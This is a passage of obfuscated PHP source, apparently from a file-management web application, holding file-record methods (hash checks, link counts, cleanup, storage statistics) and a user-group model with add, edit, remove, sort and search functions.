$•òê¦Ç, $¶Ë™ŸË, $™èÏ¬·Š, $ˆ…ÒüÅÎ); $çßÏÌ¼Ã = $this->addFileData($ÒşÅ¨Ş¼); CacheLock::unlock($­ÎËÆ¼º); if (!$¶Ë™ŸË && $çßÏÌ¼Ã) { $this->fileMd5Check($çßÏÌ¼Ã); } return $çßÏÌ¼Ã; } private function fileMd5Check($Œ²Ã†ŒÊ) { $ÜŒõÉ¨ =& $_SERVER[ñ÷§¡å]; $Ó•Ô­ËŸ = array($Œ²Ã†ŒÊ[$ÜŒõÉ¨[477]], $Œ²Ã†ŒÊ[$ÜŒõÉ¨[94]]); $Âˆñà’ = $ÜŒõÉ¨[1900] . $Œ²Ã†ŒÊ[$ÜŒõÉ¨[94]]; $¾òè‚’ = $ÜŒõÉ¨[1901] . $Œ²Ã†ŒÊ[$ÜŒõÉ¨[477]]; $€éœ±Û = TaskQueue::add($ÜŒõÉ¨[1902], $Ó•Ô­ËŸ, $Âˆñà’, $¾òè‚’); if (!$€éœ±Û) { $this->fileMd5Set($Œ²Ã†ŒÊ[$ÜŒõÉ¨[477]], $Œ²Ã†ŒÊ[$ÜŒõÉ¨[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ùÁò÷â“, $«÷½„¦©) { $óè‹åµÀ =& $_SERVER[ñ÷§¡å]; $á´Íõ¦É = $this->find($ùÁò÷â“); if (!$á´Íõ¦É || $á´Íõ¦É[$óè‹åµÀ[186]]) { return; } $—²Ñ = IO::hashMd5($«÷½„¦©); if (!$—²Ñ) { return $óè‹åµÀ[12]; } $this->where(array($óè‹åµÀ[477] => $ùÁò÷â“))->save(array($óè‹åµÀ[186] => $—²Ñ)); } public function addFileMake($œòõ‰×, $¾Ù½™À , $€¸á ş‹, $÷ü¶¶ŞŸ, $ÍêãÌ‚ö, $—•ŸÜÏ) { $¥¢Ä½§Ü =& $_SERVER[ñ÷§¡å]; $·Âùçñ = $this->createFileName($ÍêãÌ‚ö, $€¸á ş‹, $÷ü¶¶ŞŸ); $Ÿî¶’å = get_path_father($·Âùçñ); $²ì˜ï¿¶ = get_path_this($·Âùçñ); if ($—•ŸÜÏ) { $õ™²×Åƒ = IO::move($œòõ‰×, $Ÿî¶’å, !1, $²ì˜ï¿¶); } else { $õ™²×Åƒ = IO::copy($œòõ‰×, $Ÿî¶’å, !1, $²ì˜ï¿¶); } if (!$õ™²×Åƒ) { return !1; } $º§·°Ã™ = KodIO::defaultDriver(); $Ğç‡ûÑ€ = array($¥¢Ä½§Ü[594] => $¾Ù½™À , $¥¢Ä½§Ü[1896] => 1, $¥¢Ä½§Ü[429] => $ÍêãÌ‚ö, $¥¢Ä½§Ü[821] => $º§·°Ã™[$¥¢Ä½§Ü[408]], $¥¢Ä½§Ü[430] => $·Âùçñ, $¥¢Ä½§Ü[1897] => $€¸á ş‹, $¥¢Ä½§Ü[1898] => $÷ü¶¶ŞŸ); return $Ğç‡ûÑ€; } public function addFileCheckExist($±Å©±â…, $÷°’öˆ¶, $óÔÅ†É) { $ºäÕ½ˆ =& $_SERVER[ñ÷§¡å]; $´¸ÓÌ = $this->findByHash($±Å©±â…, $÷°’öˆ¶); if (!$´¸ÓÌ) { return !1; } $ûšš·÷ = array($ºäÕ½ˆ[1896] => intval($´¸ÓÌ[$ºäÕ½ˆ[1903]]) + 1, $ºäÕ½ˆ[594] => $óÔÅ†É); $this->where(array($ºäÕ½ˆ[478] => $´¸ÓÌ[$ºäÕ½ˆ[477]]))->save($ûšš·÷); return $´¸ÓÌ; } public function remove($ÑĞôŒá…) { $this->linkCountChange($ÑĞôŒá…, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ï®ˆ¬Œ€) { $this->linkCountChange($Ï®ˆ¬Œ€, !0); } public function linkCountChange($ñÕÊÍƒ‚, $ç©ı³°) { $¼æêê‘Ø =& $_SERVER[ñ÷§¡å]; if (!$ñÕÊÍƒ‚) { return; } if (!is_array($ñÕÊÍƒ‚)) { $ñÕÊÍƒ‚ = array($ñÕÊÍƒ‚); } $¬­Şé› = array(); foreach ($ñÕÊÍƒ‚ as $ “åúìş) { $ÇÁ°ç¥“ = $ “åúìş . $¼æêê‘Ø[12]; if (!$¬­Şé›[$ÇÁ°ç¥“]) { $¬­Şé›[$ÇÁ°ç¥“] = 0; } $¬­Şé›[$ÇÁ°ç¥“]++; } $öÁ³ıŒ = array(); foreach ($¬­Şé› as $ “åúìş => $ú‘²“Š†) { $ÇÁ°ç¥“ = $ú‘²“Š† . $¼æêê‘Ø[12]; if (!$öÁ³ıŒ[$ÇÁ°ç¥“]) { $öÁ³ıŒ[$ÇÁ°ç¥“] = array(); } $öÁ³ıŒ[$ÇÁ°ç¥“][] = $ “åúìş; } foreach ($öÁ³ıŒ as $ú‘²“Š† => $ƒÙœåŞÅ) { if (!$ƒÙœåŞÅ) { continue; } $ú‘²“Š† = $ç©ı³° ? $ú‘²“Š† : -intval($ú‘²“Š†); $¿ßÂĞ× = array($¼æêê‘Ø[477] => array($¼æêê‘Ø[7], $ƒÙœåŞÅ)); if ($ú‘²“Š† < 0) { $¿ßÂĞ×[$¼æêê‘Ø[1903]] = array($¼æêê‘Ø[1022], abs($ú‘²“Š†)); } $this->where($¿ßÂĞ×)->setAdd($¼æêê‘Ø[1903], $ú‘²“Š†); } } public function findByHash($»ËÖà‹Î, $—Èôô“Ó = false) { $ıóÛË•ù =& $_SERVER[ñ÷§¡å]; if (!$»ËÖà‹Î && !$—Èôô“Ó) { return !1; } $äù°ÍÈá = array($ıóÛË•ù[1897] => $»ËÖà‹Î); if ($—Èôô“Ó) { $äù°ÍÈá = array($ıóÛË•ù[1898] => $—Èôô“Ó); } return $this->order($ıóÛË•ù[1904])->where($äù°ÍÈá)->find(); } public function clearEmpty($…ã°´¬ = 0) { $â½ÕÂˆô =& $_SERVER[ñ÷§¡å]; $–ê›í»ƒ = time() - 3600 * 24 * $…ã°´¬; $øÇÅñœ = $â½ÕÂˆô[1905] . $–ê›í»ƒ; $ç¶¥€˜ = $this->where($øÇÅñœ)->select(); if (!$ç¶¥€˜) { return; } $Ù‹‡Òç± = new Task($â½ÕÂˆô[1906], $â½ÕÂˆô[12], count($ç¶¥€˜)); foreach ($ç¶¥€˜ as $µ•Ş¡) { $Ù‹‡Òç±->update(1); $this->resetFile($µ•Ş¡); } $Ù‹‡Òç±->end(); } public function resetFile($¦Ò‘Ìİ) { $¯Ëµˆğ¹ =& $_SERVER[ñ÷§¡å]; $ìµÁÖ‚ô = array($¯Ëµˆğ¹[478] => $¦Ò‘Ìİ[$¯Ëµˆğ¹[477]]); $·òˆ—¥ = Model($¯Ëµˆğ¹[1334])->where($ìµÁÖ‚ô)->count(); $®«ç¦©û = Model($¯Ëµˆğ¹[1907])->where($ìµÁÖ‚ô)->count(); $ÛÆó´°é = intval($·òˆ—¥) + intval($®«ç¦©û); if ($ÛÆó´°é == 0) { IO::remove($¦Ò‘Ìİ[$¯Ëµˆğ¹[94]]); Model($¯Ëµˆğ¹[1908])->delete($¦Ò‘Ìİ[$¯Ëµˆğ¹[477]]); $this->where($ìµÁÖ‚ô)->delete(); $this->metaSet($¦Ò‘Ìİ[$¯Ëµˆğ¹[477]], null, null); return; } if ($¦Ò‘Ìİ[$¯Ëµˆğ¹[1903]] != $ÛÆó´°é) { $this->where($ìµÁÖ‚ô)->save(array($¯Ëµˆğ¹[1896] => $ÛÆó´°é)); } } public function storageInfo($Ÿ£ıÃ«é = false) { $™¬­×ò =& $_SERVER[ñ÷§¡å]; $ÚöáÈ…í = $this->count() + 0.0; $Ç„·¬© = 0; $–” ­ = 1; $Ä³×îÙŸ = 0; $úĞ¡À¸õ = 5000; for ($Ãõ÷Ø×î = 0; $Ãõ÷Ø×î < $ÚöáÈ…í; $Ãõ÷Ø×î = $Ãõ÷Ø×î + $úĞ¡À¸õ) { $™²ñ¼Ô = $this->limit($Ãõ÷Ø×î, $Ãõ÷Ø×î + $úĞ¡À¸õ)->select(); foreach ($™²ñ¼Ô as $ÆÁî®‡ˆ) { $–” ­ += $ÆÁî®‡ˆ[$™¬­×ò[86]] * $ÆÁî®‡ˆ[$™¬­×ò[1903]]; $Ç„·¬© += $ÆÁî®‡ˆ[$™¬­×ò[86]] * ($ÆÁî®‡ˆ[$™¬­×ò[1903]] - 1); $Ä³×îÙŸ += $ÆÁî®‡ˆ[$™¬­×ò[1903]]; } } $ÉÙü™Ïİ = array($™¬­×ò[1909] => $–” ­, $™¬­×ò[1910] => $Ç„·¬©, $™¬­×ò[1911] => $Ç„·¬© / $–” ­, $™¬­×ò[90] => $ÚöáÈ…í, $™¬­×ò[1912] => $Ä³×îÙŸ); return $ÉÙü™Ïİ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\x61\x6d\x65" => "\x67\162\x6f\165\x70\137\x6d\x65\x74\x61", "\x6d\x65\164\141\106\x69\145\x6c\144" => "\147\162\157\165\x70\x49\104"); protected function cacheFunctionAlias($‰ŞÊĞŸ¿) { $Ó¬ô÷¤ =& $_SERVER[ñ÷§¡å]; return array($Ó¬ô÷¤[1913] => array($‰ŞÊĞŸ¿[0], $Ó¬ô÷¤[1914]), $Ó¬ô÷¤[1915] => array($‰ŞÊĞŸ¿[0], $Ó¬ô÷¤[1916])); } protected function getInfo($¸è„áŠÓ, $„‹õÎ´ = false) { $£şÉ¹›Ø = $this->getInfoSimple($¸è„áŠÓ); if (!$£şÉ¹›Ø) { return !1; } if ($„‹õÎ´) { return $this->_listDataApplyItem($£şÉ¹›Ø); } return $this->cacheFunctionGet($_SERVER[ñ÷§¡å][1917], $¸è„áŠÓ); } protected function getInfoSimple($º‹¢Á‡, $õÊ†Ä«ô = false) { $°øÇ­Éõ =& $_SERVER[ñ÷§¡å]; if ($õÊ†Ä«ô) { $ÅÍø­ÈÛ = array($°øÇ­Éõ[1835] => intval($º‹¢Á‡)); $Â´ÅÏÌ¥ = $this->where($ÅÍø­ÈÛ)->find(); return is_array($Â´ÅÏÌ¥) ? $Â´ÅÏÌ¥ : array(); } return $this->cacheFunctionGet($°øÇ­Éõ[1918], $º‹¢Á‡); } protected function groupAdd($¬åŒüùï) { $ƒİ’›¥ê =& $_SERVER[ñ÷§¡å]; if (!$¬åŒüùï[$ƒİ’›¥ê[441]] && isset($¬åŒüùï[$ƒİ’›¥ê[1835]]) && $¬åŒüùï[$ƒİ’›¥ê[1835]] == 1) { if ($è§ğÑ©Õ = $this->getInfoSimple($¬åŒüùï[$ƒİ’›¥ê[1835]], !0)) { return $¬åŒüùï[$ƒİ’›¥ê[1835]]; } } else { $è§ğÑ©Õ = $this->getInfoSimple($¬åŒüùï[$ƒİ’›¥ê[441]]); if (!$è§ğÑ©Õ) { return !1; } } $¿‡„‹Œ• = $ƒİ’›¥ê[540]; if ($è§ğÑ©Õ[$ƒİ’›¥ê[530]]) { $¿‡„‹Œ• = $è§ğÑ©Õ[$ƒİ’›¥ê[530]] . $è§ğÑ©Õ[$ƒİ’›¥ê[1835]] . $ƒİ’›¥ê[50]; } $ÄüÉ»¹Ç = array($ƒİ’›¥ê[429] => $this->groupNameAuto($¬åŒüùï[$ƒİ’›¥ê[441]], $¬åŒüùï[$ƒİ’›¥ê[32]]), $ƒİ’›¥ê[410] => $¬åŒüùï[$ƒİ’›¥ê[441]], $ƒİ’›¥ê[599] => $¿‡„‹Œ•, $ƒİ’›¥ê[1919] => $¬åŒüùï[$ƒİ’›¥ê[1822]], $ƒİ’›¥ê[1920] => 0, $ƒİ’›¥ê[1839] => 0); if (isset($¬åŒüùï[$ƒİ’›¥ê[1859]])) { $ÄüÉ»¹Ç[$ƒİ’›¥ê[1859]] = $¬åŒüùï[$ƒİ’›¥ê[1859]]; } else { $œâÈ¸™í = $this->max($ƒİ’›¥ê[1859]); if (!$œâÈ¸™í) { $œâÈ¸™í = 0; } $ÄüÉ»¹Ç[$ƒİ’›¥ê[1859]] = $œâÈ¸™í + 1; } if (!empty($¬åŒüùï[$ƒİ’›¥ê[1835]])) { $ÄüÉ»¹Ç[$ƒİ’›¥ê[1835]] = $¬åŒüùï[$ƒİ’›¥ê[1835]]; } $³èßùµÄ = $this->add($ÄüÉ»¹Ç); $this->setNamePinyin($³èßùµÄ, $ÄüÉ»¹Ç[$ƒİ’›¥ê[32]]); if (isset($¬åŒüùï[$ƒİ’›¥ê[1921]])) { $this->metaSet($³èßùµÄ, array($ƒİ’›¥ê[1921] => $¬åŒüùï[$ƒİ’›¥ê[1921]], $ƒİ’›¥ê[1922] => $¬åŒüùï[$ƒİ’›¥ê[1922]])); unset($¬åŒüùï[$ƒİ’›¥ê[1921]]); unset($¬åŒüùï[$ƒİ’›¥ê[1922]]); } Model($ƒİ’›¥ê[1334])->groupRootAdd($³èßùµÄ); return $³èßùµÄ; } protected function groupEdit($û¬Ù×ÁË, $·›ó”øÕ) { $’ìÆôœù =& $_SERVER[ñ÷§¡å]; $š°‹Å›Ì = $this->getInfoSimple($û¬Ù×ÁË); if (!$š°‹Å›Ì) { return !1; } if (!empty($·›ó”øÕ[$’ìÆôœù[441]])) { $ÑÎÌÈÀû = $this->getInfoSimple($·›ó”øÕ[$’ìÆôœù[441]]); if (!$ÑÎÌÈÀû) { return !1; } if ($š°‹Å›Ì[$’ìÆôœù[1835]] == $ÑÎÌÈÀû[$’ìÆôœù[1835]]) { return !1; } if ($·›ó”øÕ[$’ìÆôœù[441]] != $š°‹Å›Ì[$’ìÆôœù[441]]) { if ($ÑÎÌÈÀû[$’ìÆôœù[530]] !== $š°‹Å›Ì[$’ìÆôœù[530]] && strpos($ÑÎÌÈÀû[$’ìÆôœù[530]], $š°‹Å›Ì[$’ìÆôœù[530]] . $š°‹Å›Ì[$’ìÆôœù[1835]] . $’ìÆôœù[50]) === 0) { return !1; } $·›ó”øÕ[$’ìÆôœù[599]] = $ÑÎÌÈÀû[$’ìÆôœù[530]] . $·›ó”øÕ[$’ìÆôœù[441]] . $’ìÆôœù[50]; $this->_changeChildLevel($š°‹Å›Ì, $ÑÎÌÈÀû); } } if (isset($·›ó”øÕ[$’ìÆôœù[32]])) { $this->setNamePinyin($û¬Ù×ÁË, $·›ó”øÕ[$’ìÆôœù[32]]); } if (isset($·›ó”øÕ[$’ìÆôœù[1921]])) { $this->metaSet($û¬Ù×ÁË, array($’ìÆôœù[1921] => $·›ó”øÕ[$’ìÆôœù[1921]], $’ìÆôœù[1922] => $·›ó”øÕ[$’ìÆôœù[1922]])); unset($·›ó”øÕ[$’ìÆôœù[1921]]); unset($·›ó”øÕ[$’ìÆôœù[1922]]); } $this->_clearChildrenCache($š°‹Å›Ì); return $this->where(array($’ìÆôœù[1923] => $û¬Ù×ÁË))->save($·›ó”øÕ); } private function _clearChildrenCache($·¸Í‰×Å) { $”–ÅÄòö =& $_SERVER[ñ÷§¡å]; $–×Šîî = array($”–ÅÄòö[599] => array($”–ÅÄòö[559], $·¸Í‰×Å[$”–ÅÄòö[530]] . $·¸Í‰×Å[$”–ÅÄòö[1835]] . $”–ÅÄòö[560])); $â¸ëò‡Ì = $this->field($”–ÅÄòö[1835])->where($–×Šîî)->select(); foreach ($â¸ëò‡Ì as $¢¶˜äšÀ) { $this->_clearCache($¢¶˜äšÀ[$”–ÅÄòö[1835]]); } } private function _clearCache($ü™ĞºªÎ) { $ÎÎùä« =& $_SERVER[ñ÷§¡å]; $this->cacheFunctionClear($ÎÎùä«[1917], $ü™ĞºªÎ); $this->cacheFunctionClear($ÎÎùä«[1918], $ü™ĞºªÎ); } private function _changeChildLevel($ñÅ‰‰€¼, $ì»œ”úŸ, $šÆÜâİ = false) { $è’àí· =& $_SERVER[ñ÷§¡å]; $¥œÙì» = $ñÅ‰‰€¼[$è’àí·[530]] . $ñÅ‰‰€¼[$è’àí·[1835]] . $è’àí·[50]; $©‘¿µÅ§ = $ì»œ”úŸ[$è’àí·[530]] . $ì»œ”úŸ[$è’àí·[1835]] . $è’àí·[50] . $ñÅ‰‰€¼[$è’àí·[1835]] . $è’àí·[50]; if ($šÆÜâİ) { $©‘¿µÅ§ = $ì»œ”úŸ[$è’àí·[530]] . $ì»œ”úŸ[$è’àí·[1835]] . $è’àí·[50]; } $¬Šíµá¿ = array($è’àí·[599] => array($è’àí·[559], $ñÅ‰‰€¼[$è’àí·[530]] . $ñÅ‰‰€¼[$è’àí·[1835]] . $è’àí·[560])); $§­¼ı” = array($è’àí·[599] => array($è’àí·[608], "\162\x65\160\x6c\141\x63\145\x28\x70\x61\x72\145\x6e\x74\x4c\x65\166\x65\154\x2c\x27{$¥œÙì»}\x27\x2c\47{$©‘¿µÅ§}\x27\51")); $this->_clearChildrenCache($ñÅ‰‰€¼); $this->where($¬Šíµá¿)->data($§­¼ı”)->save(); } public function setNamePinyin($¢¤Ş é, $¯¤úËê = false) { $¦ÇğèÚ =& $_SERVER[ñ÷§¡å]; if (!$¯¤úËê) { $§°È¢²ı = $this->getInfoSimple($¢¤Ş é); $¯¤úËê = $§°È¢²ı[$¦ÇğèÚ[32]]; } if (!Input::check($¯¤úËê, $¦ÇğèÚ[602])) { $this->metaSet($¢¤Ş é, $¦ÇğèÚ[474], null); $this->metaSet($¢¤Ş é, $¦ÇğèÚ[473], null); return; } $¤ëø€´Ò = array($¦ÇğèÚ[474] => str_replace($¦ÇğèÚ[53], $¦ÇğèÚ[12], Pinyin::get($¯¤úËê)), $¦ÇğèÚ[473] => Pinyin::get($¯¤úËê, $¦ÇğèÚ[603])); $this->metaSet($¢¤Ş é, $¤ëø€´Ò); } protected function groupStatus($ô›¤ŒÉŒ, $‡Ú¹·¸) { $Øßô«î¤ =& $_SERVER[ñ÷§¡å]; $î÷ä¨«† = $this->getInfoSimple($ô›¤ŒÉŒ); if (!$î÷ä¨«†) { return !1; } if ($‡Ú¹·¸ == $Øßô«î¤[98]) { $·àó¾ = $this->parentLevelArray($î÷ä¨«†[$Øßô«î¤[530]]); } else { $ü¸õòß = array($Øßô«î¤[599] => array($Øßô«î¤[559], $î÷ä¨«†[$Øßô«î¤[530]] . $î÷ä¨«†[$Øßô«î¤[1835]] . $Øßô«î¤[560])); $·àó¾ = $this->where($ü¸õòß)->field($Øßô«î¤[1835])->select(); $·àó¾ = array_to_keyvalue($·àó¾, $Øßô«î¤[12], $Øßô«î¤[1835]); } $·àó¾[] = $î÷ä¨«†[$Øßô«î¤[1835]]; $—•°‘ß€ = array(); foreach ($·àó¾ as $ô›¤ŒÉŒ) { $—•°‘ß€[] = array($Øßô«î¤[1835] => $ô›¤ŒÉŒ, $Øßô«î¤[104] => $Øßô«î¤[763], $Øßô«î¤[383] => $‡Ú¹·¸); $this->_clearCache($ô›¤ŒÉŒ); } return Model($Øßô«î¤[1924])->addAll($—•°‘ß€, array(), !0); } protected function groupRemove($»úÌ€ø, $¿“ÍèÜ = false) { $³½·ÄÎú =& $_SERVER[ñ÷§¡å]; $©¼«ÀÖ = array($³½·ÄÎú[1835] => $»úÌ€ø); $Ø¼ªÙ‰µ = $this->where($©¼«ÀÖ)->find(); if (!$Ø¼ªÙ‰µ || $Ø¼ªÙ‰µ[$³½·ÄÎú[441]] == 0) { return !1; } if (!$¿“ÍèÜ) { $ ’õäÅÈ = $this->getInfoSimple($Ø¼ªÙ‰µ[$³½·ÄÎú[441]]); $this->_changeChildLevel($Ø¼ªÙ‰µ, $ ’õäÅÈ, !0); $this->where(array($³½·ÄÎú[441] => $»úÌ€ø))->save(array($³½·ÄÎú[441] => $Ø¼ªÙ‰µ[$³½·ÄÎú[441]])); } Model($³½·ÄÎú[1924])->where($©¼«ÀÖ)->delete(); Model($³½·ÄÎú[1925])->where($©¼«ÀÖ)->delete(); Model($³½·ÄÎú[838])->groupRootRemove($»úÌ€ø); return $this->where($©¼«ÀÖ)->delete(); } protected function groupSort($øûçÁÚµ) { $ßÙ…ÑÎ =& $_SERVER[ñ÷§¡å]; $â¶øŸŸ = array(); foreach ($øûçÁÚµ as $Šâğ¢ÃÊ => $ìş¶¯õÎ) { $â¶øŸŸ[] = array($ßÙ…ÑÎ[1835], $ìş¶¯õÎ, $ßÙ…ÑÎ[1859], $Šâğ¢ÃÊ + 1); } $this->saveAll($â¶øŸŸ); } public function listData() { $œı¤Ğ£ö = $this->_makeOrder()->selectPage(50); $this->_listDataApply($œı¤Ğ£ö[$_SERVER[ñ÷§¡å][378]]); return $œı¤Ğ£ö; } private function _makeOrder($”ò‚—¼¾ = '') { $»ÎÛÊ´ =& $_SERVER[ñ÷§¡å]; $á­ÓÏåî = array($»ÎÛÊ´[1835], $»ÎÛÊ´[32], $»ÎÛÊ´[1824], $»ÎÛÊ´[210]); $âôœçèĞ = array($»ÎÛÊ´[459] => $»ÎÛÊ´[460], $»ÎÛÊ´[461] => $»ÎÛÊ´[462]); $‚‘ìñÄ¶ = Input::get($»ÎÛÊ´[466], $»ÎÛÊ´[7], $»ÎÛÊ´[1839], $á­ÓÏåî); $©¥ü¨ƒ« = Input::get($»ÎÛÊ´[467], $»ÎÛÊ´[7], $»ÎÛÊ´[1926], array($»ÎÛÊ´[1926], $»ÎÛÊ´[461])); $©¥ü¨ƒ« = $âôœçèĞ[$©¥ü¨ƒ«]; $”ò‚—¼¾ = $”ò‚—¼¾ . "{$‚‘ìñÄ¶}\x20{$©¥ü¨ƒ«}\x2c\x20\147\x72\x6f\x75\x70\111\104\40\x61\163\x63"; return $this->order($”ò‚—¼¾); } public function listChild($ô”ÌíÜŞ) { $”ƒü«€Ã =& $_SERVER[ñ÷§¡å]; $šğ…„­ = $this->where(array($”ƒü«€Ã[441] => $ô”ÌíÜŞ))->_makeOrder()->selectPage(200); $this->_listDataApply($šğ…„­[$”ƒü«€Ã[378]]); return $šğ…„­; } public function listChildIds($æ®”¨Âî) { $£‚ç‹Øó =& $_SERVER[ñ÷§¡å]; if (is_string($í¬Ôñ‰ü)) { $æ®”¨Âî = explode($£‚ç‹Øó[50], $æ®”¨Âî); } $§ğ¢íú = $this->where(array($£‚ç‹Øó[1835] => array($£‚ç‹Øó[7], $æ®”¨Âî)))->field($£‚ç‹Øó[1927])->select(); if (!$§ğ¢íú) { return !1; } $¢ÙØÁÁî = array(); foreach ($§ğ¢íú as $²Çé›‚) { $¢ÙØÁÁî[] = "\x73\x65\154\x65\x63\x74\x20\147\162\157\x75\160\111\104\40\146\x72\157\x6d\x20\140\147\x72\157\x75\x70\140\x20\x77\150\x65\162\145\x20\x70\141\x72\145\x6e\164\114\x65\166\x65\154\x20\154\x69\153\x65\x20\47{$²Çé›‚[$£‚ç‹Øó[530]]}{$²Çé›‚[$£‚ç‹Øó[1835]]}\54\x25\x27"; } $¢ÙØÁÁî = implode($£‚ç‹Øó[1928], $¢ÙØÁÁî); $§ğ¢íú = $this->query($¢ÙØÁÁî); if (!$§ğ¢íú) { return array(); } $æ®”¨Âî = array_to_keyvalue($§ğ¢íú, $£‚ç‹Øó[12], $£‚ç‹Øó[1835]); return array_unique($æ®”¨Âî); } public function listByID($ù¡İôÂª) { $Â»Ò†¤Ÿ =& $_SERVER[ñ÷§¡å]; if (!$ù¡İôÂª) { return array(); } $°ğ¦°¬¸ = array($Â»Ò†¤Ÿ[1835] => array($Â»Ò†¤Ÿ[7], $ù¡İôÂª)); $ûä˜ÚĞ– = $this->where($°ğ¦°¬¸)->select(); $ûä˜ÚĞ– = array_sort_keep($ûä˜ÚĞ–, $Â»Ò†¤Ÿ[1835], $ù¡İôÂª); $this->_listDataApply($ûä˜ÚĞ–); return $ûä˜ÚĞ–; } public function listSearch($–™§ı„) { $è×ñ€—· =& $_SERVER[ñ÷§¡å]; $ù£§Ã¥ç = $–™§ı„[$è×ñ€—·[1929]]; $‰åÛ¬® = isset($–™§ı„[$è×ñ€—·[1930]]) ? $–™§ı„[$è×ñ€—·[1930]] : !1; if (!trim($ù£§Ã¥ç)) { return !1; } $ù£§Ã¥ç = str_replace($è×ñ€—·[1931], $è×ñ€—·[1932], $ù£§Ã¥ç); $œ«úØ‰ó = array($è×ñ€—·[1835] => array($è×ñ€—·[392], "{$ù£§Ã¥ç}\45"), $è×ñ€—·[32] => array($è×ñ€—·[392], "\x25{$ù£§Ã¥ç}\x25"), $è×ñ€—·[1007] => $è×ñ€—·[1933]); if ($‰åÛ¬®) { $³Éò˜°æ = $this->getInfoSimple($‰åÛ¬®); $Åèı¾Ø = $³Éò˜°æ[$è×ñ€—·[530]] . $‰åÛ¬® . $è×ñ€—·[560]; $œ«úØ‰ó = array($œ«úØ‰ó, array($è×ñ€—·[530] => array($è×ñ€—·[392], $Åèı¾Ø))); } $œ«úØ‰ó = $this->parseWhereLike($œ«úØ‰ó); $Êºâ›íö = $this->_makeOrder()->where($œ«úØ‰ó)->selectPage(20); $Êºâ›íö = $Êºâ›íö ? $Êºâ›íö : array($è×ñ€—·[378] => array(), $è×ñ€—·[375] => array()); if (!$Êºâ›íö || count($Êºâ›íö[$è×ñ€—·[378]]) < 5 && Input::check($ù£§Ã¥ç, $è×ñ€—·[327])) { $÷ Òñ½Ò = $this->groupChildrenAll($‰åÛ¬®); $ í¡¡æ† = $this->_searchFromMeta($è×ñ€—·[473], $ù£§Ã¥ç, 10, $÷ Òñ½Ò); $”ã‡¼æÓ = $this->_searchFromMeta($è×ñ€—·[474], $ù£§Ã¥ç, 10, $÷ Òñ½Ò); $æâÌ®¡è = array_merge($ í¡¡æ†, $”ã‡¼æÓ, $Êºâ›íö[$è×ñ€—·[378]]); $Êºâ›íö[$è×ñ€—·[378]] = array_unique_by_key($æâÌ®¡è, $è×ñ€—·[1835]); $Êºâ›íö[$è×ñ€—·[375]][$è×ñ€—·[376]] = count($Êºâ›íö[$è×ñ€—·[378]]); $Êºâ›íö[$è×ñ€—·[375]][$è×ñ€—·[377]] = ceil($Êºâ›íö[$è×ñ€—·[375]][$è×ñ€—·[376]] / $Êºâ›íö[$è×ñ€—·[375]][$è×ñ€—·[372]]); } $this->_listDataApply($Êºâ›íö[$è×ñ€—·[378]]); return $Êºâ›íö; } protected function groupChildrenAll($âŸá’ØŒ) { $¾•á’×¯ =& $_SERVER[ñ÷§¡å]; if (!$âŸá’ØŒ) { return !1; } if (is_string($âŸá’ØŒ)) { $âŸá’ØŒ = array($âŸá’ØŒ); } $ğ™‰€Ñ¹ = $âŸá’ØŒ; foreach ($âŸá’ØŒ as $éØÂ“şò) { $Åşæî = $this->getInfoSimple($éØÂ“şò); $ÎÌ±òÒ = array($¾•á’×¯[530] => array($¾•á’×¯[392], $Åşæî[$¾•á’×¯[530]] . $éØÂ“şò . $¾•á’×¯[560])); $ÖÆ»õºœ = $this->field($¾•á’×¯[1835])->where($ÎÌ±òÒ)->select(); $ğ™‰€Ñ¹ = array_merge($ğ™‰€Ñ¹, array_to_keyvalue($ÖÆ»õºœ, $¾•á’×¯[12], $¾•á’×¯[1835])); } return array_unique($ğ™‰€Ñ¹); } private function _searchFromMeta($òÂ…µü«, $ìÅßÔó¡, $Èæ¸¬ò€, $éÒ³¦ïÂ) { $Ò¹Ïû¦‹ =& $_SERVER[ñ÷§¡å]; $ìÅßÔó¡ = strtolower($ìÅßÔó¡); $¦´˜éÈî = array($Ò¹Ïû¦‹[104] => $òÂ…µü«, $Ò¹Ïû¦‹[383] => array($Ò¹Ïû¦‹[392], "\x25{$ìÅßÔó¡}\45")); $¦´˜éÈî = $this->parseWhereLike($¦´˜éÈî); if ($éÒ³¦ïÂ) { $¦´˜éÈî[$Ò¹Ïû¦‹[1835]] = array($Ò¹Ïû¦‹[7], $éÒ³¦ïÂ); } $şäß§²Ï = Model($Ò¹Ïû¦‹[1934])->where($¦´˜éÈî)->limit($Èæ¸¬ò€)->select(); if (!$şäß§²Ï) { return array(); } $şäß§²Ï = array_to_keyvalue($şäß§²Ï, $Ò¹Ïû¦‹[12], $Ò¹Ïû¦‹[1835]); $ŒÑ‡ËÕ£ = $this->where(array($Ò¹Ïû¦‹[1923] => array($Ò¹Ïû¦‹[7], $şäß§²Ï)))->select(); if (!$ŒÑ‡ËÕ£) { return array(); } return $ŒÑ‡ËÕ£; } protected function _listDataApplyItem($·‚«¼‘ã) { $æÁ‡ÃƒÆ = array($·‚«¼‘ã); $this->_listDataApply($æÁ‡ÃƒÆ); return $æÁ‡ÃƒÆ[0]; } protected function _listDataApply(&$º‚ÕôÜõ) { $¡Ûõïİİ =& $_SERVER[ñ÷§¡å]; if (!$º‚ÕôÜõ) { return; } $Õ‡Ğ–ß€ = array_to_keyvalue($º‚ÕôÜõ, $¡Ûõïİİ[12], $¡Ûõïİİ[1835]); $this->_listAppendChildren($º‚ÕôÜõ); $this->_listAppendChildrenMember($º‚ÕôÜõ); $this->_listAppendMeta($º‚ÕôÜõ, $Õ‡Ğ–ß€); $this->_listAppendParent($º‚ÕôÜõ); $this->_listAppendSourceRoot($º‚ÕôÜõ, $Õ‡Ğ–ß€); } private function _listAppendChildren(&$Œ¾†€à) { $àøÛîõğ =& $_SERVER[ñ÷§¡å]; $Öşğ˜ = array_to_keyvalue($Œ¾†€à, $àøÛîõğ[12], $àøÛîõğ[1835]); $ĞŞµ±šê = array($àøÛîõğ[441] => array($àøÛîõğ[7], $Öşğ˜)); $±·áÂÎ© = array($àøÛîõğ[441], $àøÛîõğ[1935] => $àøÛîõğ[509]); $Ë¨è¿µĞ = $this->field($±·áÂÎ©)->where($ĞŞµ±šê)->group($àøÛîõğ[441])->select(); $úü†Á² = array_to_keyvalue($Ë¨è¿µĞ, $àøÛîõğ[441], $àøÛîõğ[509]); foreach ($Œ¾†€à as &$½¦ş‚ºò) { $½ÂÚÍÂ = $½¦ş‚ºò[$àøÛîõğ[1835]]; $½¦ş‚ºò[$àøÛîõğ[1936]] = 